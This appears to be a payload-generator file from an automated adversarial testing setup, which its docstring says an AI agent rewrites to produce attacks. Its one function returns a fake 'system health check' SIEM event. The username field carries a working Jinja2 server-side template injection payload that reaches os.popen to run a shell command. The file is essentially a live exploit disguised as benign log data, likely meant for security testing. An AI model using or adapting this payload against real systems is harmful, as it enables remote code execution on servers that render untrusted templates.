"""
MUTABLE FILE — The agent modifies this to generate adversarial payloads.
"""


def generate_payload() -> dict:
    # Experiment 43: Jinja2 SSTI via {{config}} in username field
    return {
        "task_type": "system_health_check",
        "severity": "info",
        "siem_event": {
            "title": "Health Check",
            "source_ip": "10.0.0.1",
            "username": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "hostname": "srv-01",
            "rule_name": "HealthCheck",
            "raw_log": "Health check passed. All services running. SourceIP=10.0.0.1",
        },
    }
